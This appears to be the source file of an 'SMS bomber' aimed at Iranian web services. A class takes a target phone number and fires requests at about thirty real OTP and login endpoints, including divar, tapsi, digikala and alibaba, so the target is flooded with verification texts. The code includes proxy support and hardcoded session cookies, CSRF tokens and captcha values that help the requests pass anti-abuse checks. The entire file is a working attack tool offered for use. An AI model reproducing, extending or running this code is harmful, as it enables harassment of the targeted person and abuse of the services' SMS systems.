# Github: https://github.com/ibehii
# Telegram: https://t.me/dr_xz
# e-mail: Behii@tutanota.com
# ____________________________________________

"""SMS bomb dispatching implementation for Iranian web and mobile services."""

from types import TracebackType
from typing import Any, Optional
import uuid
import requests
from requests import Response

from lib import Headers, bomb_exceptions

DEFAULT_REQUEST_TIMEOUT: float = 10.0


class IranianSMS:
    """Dispatches verification code SMS requests to supported Iranian web services.

    Parameters
    ----------
    phone_number : str
        Target Iranian phone number (typically 11 digits starting with '09').
    request_timeout : float, optional
        Maximum timeout in seconds for outgoing HTTP requests, by default 10.0.
    http_session : requests.Session | None, optional
        Optional shared requests.Session object for HTTP connection pooling.
    proxy_url : str | None, optional
        Optional proxy URI to route outgoing requests through.
    """

    def __init__(
        self,
        phone_number: str,
        request_timeout: float = DEFAULT_REQUEST_TIMEOUT,
        http_session: requests.Session | None = None,
        proxy_url: Optional[str] = None,
    ) -> None:
        self.phone_number: str = phone_number
        # Maintain backward-compatible attribute
        self.PhoneNumber: str = phone_number
        self.request_timeout: float = request_timeout
        self.current_proxy_url: Optional[str] = proxy_url

        if http_session is not None:
            self.session: requests.Session = http_session
            self._owns_session: bool = False
        else:
            self.session = requests.Session()
            self._owns_session = True

        if proxy_url:
            self.set_proxy(proxy_url)

    def set_proxy(self, proxy_url: Optional[str]) -> None:
        """Update or clear the active proxy configuration for this session."""
        self.current_proxy_url = proxy_url
        if proxy_url:
            self.session.proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }
        else:
            self.session.proxies = {}

    @property
    def phone_without_leading_zero(self) -> str:
        """Return the target phone number stripped of Iranian country or trunk prefixes."""
        if self.phone_number.startswith("+98"):
            return self.phone_number[3:]
        if self.phone_number.startswith("98"):
            return self.phone_number[2:]
        if self.phone_number.startswith("0"):
            return self.phone_number[1:]
        return self.phone_number

    def __enter__(self) -> "IranianSMS":
        return self

    def __exit__(
        self,
        exception_type: type[BaseException] | None,
        exception_value: BaseException | None,
        traceback: TracebackType | None,
    ) -> None:
        self.close()

    def close(self) -> None:
        """Close the underlying HTTP session if owned by this instance."""
        if getattr(self, "_owns_session", False) and self.session is not None:
            self.session.close()

    def _post(self, request_url: str, **request_keyword_arguments: Any) -> Response:
        """Execute a POST request with default timeout."""
        request_keyword_arguments.setdefault("timeout", self.request_timeout)
        return self.session.post(request_url, **request_keyword_arguments)

    def _get(self, request_url: str, **request_keyword_arguments: Any) -> Response:
        """Execute a GET request with default timeout."""
        request_keyword_arguments.setdefault("timeout", self.request_timeout)
        return self.session.get(request_url, **request_keyword_arguments)

    @classmethod
    def get_service_methods(cls) -> list[str]:
        """Return an ordered list of callable SMS provider service method names."""
        excluded_attribute_names: set[str] = {
            "close",
            "filter_service_methods",
            "get_service_methods",
            "phone_without_leading_zero",
            "set_proxy",
        }
        return [
            method_name
            for method_name in dir(cls)
            if not method_name.startswith("_")
            and method_name not in excluded_attribute_names
            and callable(getattr(cls, method_name))
        ]

    @classmethod
    def filter_service_methods(
        cls,
        selected_services: Optional[list[str]] = None,
    ) -> list[str]:
        """Return discovered service methods matching the optional filter criteria.

        Parameters
        ----------
        selected_services : Optional[list[str]], optional
            Optional list of service name strings to execute, by default None.

        Returns
        -------
        list[str]
            Filtered service method names.
        """
        all_service_names: list[str] = cls.get_service_methods()
        if not selected_services:
            return all_service_names

        normalized_filter_targets: set[str] = {
            target_name.strip().lower().replace("-", "_")
            for target_name in selected_services
            if target_name.strip()
        }

        if not normalized_filter_targets:
            return all_service_names

        return [
            service_name
            for service_name in all_service_names
            if service_name.lower().replace("-", "_") in normalized_filter_targets
        ]

    # ==================== Service Provider Methods ==================== #

    @bomb_exceptions.error_handler
    def divar(self) -> Response:
        """Send SMS using divar.ir authentication API."""
        divar_url: str = "https://api.divar.ir/v5/auth/authenticate"
        json_payload: dict[str, str] = {"phone": self.phone_number}
        return self._post(
            divar_url,
            headers=Headers.divar_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def tapsi_passenger(self) -> Response:
        """Send SMS using tapsi.ir passenger login API."""
        tapsi_passenger_url: str = "https://accounts-api.tapsi.ir/api/v1/sso-user/auth"
        request_cookies: dict[str, str] = {
            "__arcsco": "6bb021ad4353286b466629402d8c68a0"
        }
        dynamic_session_id: str = f"{uuid.uuid4()}--{uuid.uuid4()}"
        json_payload: dict[str, str] = {
            "session_id": dynamic_session_id,
            "selected_step_key": "PROMPT_FOR_SMS_CODE",
            "phone_number": self.phone_number,
        }
        return self._post(
            tapsi_passenger_url,
            headers=Headers.tapsi_passenger_login,
            cookies=request_cookies,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def tapsi_biker(self) -> Response:
        """Send SMS using tapsi.ir biker credential API."""
        tapsi_biker_url: str = "https://tap33.me/api/v2/user"
        json_payload: dict[str, Any] = {
            "credential": {
                "phoneNumber": self.phone_number,
                "role": "BIKER",
            }
        }
        return self._post(
            tapsi_biker_url,
            headers=Headers.tapsi_biker_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def tapsi_driver(self) -> Response:
        """Send SMS using tapsi.ir driver registration API."""
        tapsi_driver_url: str = "https://api.tapsi.ir/api/v2.2/user"
        json_payload: dict[str, Any] = {
            "credential": {
                "phoneNumber": self.phone_number,
                "role": "DRIVER",
            },
            "otpOption": "SMS",
        }
        return self._post(
            tapsi_driver_url,
            headers=Headers.tapsi_driver_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def trob(self) -> Response:
        """Send SMS using torob.com verification PIN API."""
        trob_url: str = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self.phone_number}"
        return self._get(trob_url, headers=Headers.trob_header)

    @bomb_exceptions.error_handler
    def sheypoor(self) -> Response:
        """Send SMS using sheypoor.com auth verification API."""
        sheypoor_url: str = "https://www.sheypoor.com/api/v10.0.0/auth/send"
        json_payload: dict[str, str] = {"username": self.phone_number}
        return self._post(
            sheypoor_url,
            headers=Headers.sheypoor_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def sheypoor_app_link(self) -> Response:
        """Send SMS application link using sheypoor.com web download API."""
        sheypoor_app_link_url: str = "https://www.sheypoor.com/api/web/download/send-notification"
        form_payload: dict[str, str] = {"mobile": self.phone_number}
        return self._post(
            sheypoor_app_link_url,
            headers=Headers.sheypoor_app_link,
            data=form_payload,
        )

    @bomb_exceptions.error_handler
    def okcs(self) -> Response:
        """Send SMS using okcs.com mobile login API."""
        okcs_url: str = "https://okcs.com/users/mobilelogin"
        form_payload: dict[str, str] = {
            "mobile": self.phone_number,
            "url": "https%3A%2F%2Fokcs.com",
        }
        return self._post(
            okcs_url,
            headers=Headers.okcs_header,
            data=form_payload,
        )

    @bomb_exceptions.error_handler
    def alibaba(self) -> Response:
        """Send SMS OTP using ws.alibaba.ir account API."""
        alibaba_url: str = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        json_payload: dict[str, str] = {"phoneNumber": self.phone_number}
        return self._post(
            alibaba_url,
            headers=Headers.alibaba_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def oketab(self) -> Response:
        """Send SMS using oketab.com verification API."""
        oketab_url: str = f"https://www.oketab.com/index.php?login&rotp=true&mb={self.phone_number}"
        return self._post(oketab_url, headers=Headers.oketab)

    @bomb_exceptions.error_handler
    def GapFilm(self) -> Response:
        """Send SMS using Gapfilm.ir account login API."""
        gapfilm_url: str = "https://core.gapfilm.ir/api/v3.1/Account/Login"
        json_payload: dict[str, Any] = {
            "Type": 3,
            "Username": self.phone_number,
        }
        return self._post(
            gapfilm_url,
            headers=Headers.GapFilm_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def FilmNet(self) -> Response:
        """Send SMS using tv.filmnet.ir access-token OTP API."""
        filmnet_url: str = f"https://tv.filmnet.ir/api-v2/access-token/users/{self.phone_number}/otp"
        return self._get(filmnet_url, headers=Headers.filmnet_header)

    @bomb_exceptions.error_handler
    def DrDr(self) -> Response:
        """Send SMS using drdr.ir mobile authentication API."""
        drdr_url: str = "https://drdr.ir/api/v3/auth/login/mobile/init"
        json_payload: dict[str, str] = {"mobile": self.phone_number}
        return self._post(
            drdr_url,
            headers=Headers.DrDr_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def itoll_app_link(self) -> Response:
        """Send application download link SMS using itoll.com API."""
        itoll_url: str = "https://app.itoll.com/api/v1/send-application-link"
        json_payload: dict[str, str] = {"mobile": self.phone_number}
        return self._post(
            itoll_url,
            headers=Headers.itoll_app_link_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def anar360(self) -> Response:
        """Send SMS using anar360.com auth verification API."""
        anar360_url: str = "https://anar360.com/api/_/auth/check"
        json_payload: dict[str, str] = {"mobile": self.phone_number}
        return self._post(
            anar360_url,
            headers=Headers.anar360_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def azki(self) -> Response:
        """Send SMS using azki.com login availability check API."""
        azki_url: str = "https://www.azki.com/api/core/v2/app/auth/check-login-availability//"
        json_payload: dict[str, str] = {"phoneNumber": self.phone_number}
        return self._post(
            azki_url,
            headers=Headers.azki_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def Nashr_olgoo(self) -> Response:
        """Send SMS using olgoobooks.ir student signup API."""
        nashr_olgoo_url: str = "https://www.olgoobooks.ir/signupStudents/"
        form_payload: dict[str, Any] = {
            "contactInfo[mobile]": self.phone_number,
            "contactInfo[agreementAccepted]": "1",
            "contactInfo[message]": "",
            "contactInfo[eduFieldId]": "1",
            "contactInfo[eduLevelId]": "17",
            "contactInfo[securityCode]": "3854",
            "submit_register": ["ارسال کد تایید", "1"],
        }
        request_cookies: dict[str, str] = {
            "PHPSESSID": "pq0h26ma4h49jq2qo0i98afnfo"
        }
        return self._post(
            nashr_olgoo_url,
            headers=Headers.Nashr_olgoo_header,
            cookies=request_cookies,
            data=form_payload,
        )

    @bomb_exceptions.error_handler
    def banimode(self) -> Response:
        """Send SMS using mobapi.banimode.com auth request API."""
        banimode_url: str = "https://mobapi.banimode.com/api/v2/auth/request"
        json_payload: dict[str, str] = {"phone": self.phone_number}
        return self._post(
            banimode_url,
            headers=Headers.banimode_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def lendo(self) -> Response:
        """Send SMS OTP using lendoco.ir customer auth API."""
        lendo_url: str = "https://api.lendoco.ir/api/customer/auth/send-otp"
        json_payload: dict[str, str] = {"mobile": self.phone_number}
        return self._post(
            lendo_url,
            headers=Headers.lendo_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def basalam(self) -> Response:
        """Send SMS OTP using auth.basalam.com OTP request API."""
        basalam_url: str = "https://auth.basalam.com/otp-request"
        json_payload: dict[str, Any] = {
            "mobile": self.phone_number,
            "client_id": 11,
        }
        return self._post(
            basalam_url,
            headers=Headers.basalam_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def drsaina(self) -> Response:
        """Send SMS using drsaina.com authentication user-exist API."""
        drsaina_url: str = f"https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber={self.phone_number}"
        return self._get(drsaina_url, headers=Headers.drsaina_header)

    @bomb_exceptions.error_handler
    def see5(self) -> Response:
        """Send SMS OTP using crm.see5.net sendotp API."""
        see5_url: str = "https://crm.see5.net/api_ajax/sendotp.php"
        form_payload: str = (
            f"mobile={self.phone_number}&action=sendsms&mcaptcha=764515"
        )
        return self._post(
            see5_url,
            headers=Headers.see5_header,
            data=form_payload,
        )

    @bomb_exceptions.error_handler
    def bimito(self) -> Response:
        """Send SMS using bimito.com auth check availability API."""
        bimito_url: str = "https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/"
        json_payload: dict[str, str] = {"phoneNumber": self.phone_number}
        return self._post(
            bimito_url,
            headers=Headers.bimito_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def sibirani(self) -> Response:
        """Send SMS invitation using sibirani.com API."""
        sibirani_url: str = "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token"
        json_payload: dict[str, str] = {"username": self.phone_number}
        return self._post(
            sibirani_url,
            headers=Headers.sibirani_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def hamrah_mechanic(self) -> Response:
        """Send SMS OTP using hamrah-mechanic.com membership API."""
        hamrah_mechanic_url: str = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
        json_payload: dict[str, str] = {
            "PhoneNumber": self.phone_number,
            "prevDomainUrl": "https://www.google.com/",
            "landingPageUrl": "https://www.hamrah-mechanic.com/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "prevUrl": "https://www.hamrah-mechanic.com/contactus/",
            "referrer": "https://www.google.com/",
        }
        return self._post(
            hamrah_mechanic_url,
            headers=Headers.hamrah_mechanic_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def varzesh3(self) -> Response:
        """Send SMS using sso.varzesh3.com account login API."""
        varzesh3_url: str = "https://sso.varzesh3.com/account/login"
        query_parameters: dict[str, str] = {
            "ReturnUrl": (
                "/connect/authorize/callback?client_id=0D996589651C4235B7D40837E8C1DBC2F60410B2C9304298B568"
                "&redirect_uri=https%3A%2F%2Fwww.varzesh3.com%2Foidc%2Fcallback&response_type=code"
                "&scope=openid%20profile%20offline_access%20videos.api%20comments.api%20profile.api"
                "%20world-cup.prediction.api%20engagement.api%20notification.api%20pishbini.api"
                "&state=699e3ede1b124f24b353b90663dc3a58"
                "&code_challenge=7IoMY0nO9YgXzdCItZjfVKvslbvnin7F7ZnUwOR7HvY"
                "&code_challenge_method=S256&response_mode=query"
            )
        }
        request_cookies: dict[str, str] = {
            ".raft": (
                "CfDJ8K3TtALnqMtNjlXXQOu7VBHUYoWz4cWPHNGl_6-BJi5LPGoIBLD6iYlBZ1L1pwC4zg3NuaZlgev-SAl2W8E3"
                "tZmltisr_Fq5sQVBIR0cz75Hrqidf_vOKq6R16cCynyX0schy2sqo0uOgDwUCP-pWPg"
            )
        }
        form_payload: dict[str, str] = {
            "ReturnUrl": query_parameters["ReturnUrl"],
            "PhoneNumber": self.phone_without_leading_zero,
            "Username": f"98{self.phone_without_leading_zero}",
            "button": "login",
            "__RequestVerificationToken": (
                "CfDJ8K3TtALnqMtNjlXXQOu7VBGXgRS6-tcTLNqZTWk_u1TEnaXB8bOk6NS4xtoOOc2Ptyv1Ww3Mdw5uWAgFZJs"
                "Ua2NM0hydzQP8RmW3MScL4Zjj5x30oOEmL4Ok4WcMbl-TRVFQQgy7D4GG8cWI_CkYQgk"
            ),
        }
        return self._post(
            varzesh3_url,
            headers=Headers.varzesh3_header,
            data=form_payload,
            cookies=request_cookies,
            params=query_parameters,
        )

    @bomb_exceptions.error_handler
    def digikala(self) -> Response:
        """Send SMS using digikala.com user authentication API."""
        digikala_url: str = "https://api.digikala.com/v1/user/authenticate/"
        request_cookies: dict[str, str] = {
            "_sp_id.13cb": (
                "ea35d45f-b735-43cb-86fb-a3e9725a68af.1720376938.1.1720377053..be86ef53-bc7b-48f7-a4d5-"
                "f7bc412ec0ac..a985481f-0e48-4c12-bebc-3a893a830130.1720376937683.15"
            ),
            "tracker_glob_new": "aRyzJy2",
            "TS01c77ebf": (
                "0102310591a9f7df94c8dd03aea8c1a0d91424373571a0a51f5e2ee0cc4ee4a7537fa70ca029ed2b1de9d2"
                "cde2259ed90e63cd94fc1b73141733ea5a95427182d604572bd4"
            ),
            "TS01b6ea4d": (
                "0102310591d3e4be1223e5221fc4b1e87580c76e4e71a0a51f5e2ee0cc4ee4a7537fa70ca04ccda64b149c"
                "72d81f530b403b126a5fd9e8cb405f95a78f010093b88ac08cb006af70c373ba42115e7ae1a1981b13c8"
            ),
            "ab_test_experiments": (
                "%5B%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22f0fd80107233fa604679779d7e121710%22%2C%"
                "2237136fdc21e0b782211ccac8c2d7be63%22%5D"
            ),
        }
        json_payload: dict[str, Any] = {
            "backUrl": "/",
            "username": self.phone_number,
            "otp_call": False,
        }
        return self._post(
            digikala_url,
            headers=Headers.digikala_headers,
            json=json_payload,
            cookies=request_cookies,
        )

    @bomb_exceptions.error_handler
    def telewebion(self) -> Response:
        """Send SMS using gateway.telewebion.com authentication step-one API."""
        telewebion_url: str = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
        json_payload: dict[str, str] = {
            "code": "98",
            "phone": self.phone_without_leading_zero,
            "smsStatus": "default",
        }
        return self._post(
            telewebion_url,
            headers=Headers.telewebion_headers,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def pindo(self) -> Response:
        """Send SMS using api.pindo.ir login-register API."""
        pindo_url: str = "https://api.pindo.ir/v1/user/login-register/"
        json_payload: dict[str, str] = {"phone": self.phone_number}
        return self._post(
            pindo_url,
            headers=Headers.pindo_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def classino(self) -> Response:
        """Send SMS using student.classino.com OTP login API."""
        classino_url: str = "https://panel.classino.com/api/v2/auth/login"
        json_payload: dict[str, str] = {"mobile": self.phone_number}
        return self._post(
            classino_url,
            headers=Headers.classino_header,
            json=json_payload,
        )

    @bomb_exceptions.error_handler
    def goftino(self) -> Response:
        """Send SMS using my.goftino.com telephone verification API."""
        goftino_url: str = "https://my.goftino.com/action/request_verify_tel"
        form_payload: dict[str, str] = {
            "tel": self.phone_number,
            "hash": "b7331a9db13150b6c415239f1d32158c2bda9a2f",
        }
        request_cookies: dict[str, str] = {
            "goftinoSession": (
                "s%3AFxCYR7MkUkquPFPdZ7dhDo2QykDa4k4e.qC7l9uOustr1mO4FCGyYrxArnjipoXwUibkmUIKIblk"
            )
        }
        return self._post(
            goftino_url,
            headers=Headers.goftino_header,
            cookies=request_cookies,
            data=form_payload,
        )


__all__ = ["IranianSMS", "DEFAULT_REQUEST_TIMEOUT"]
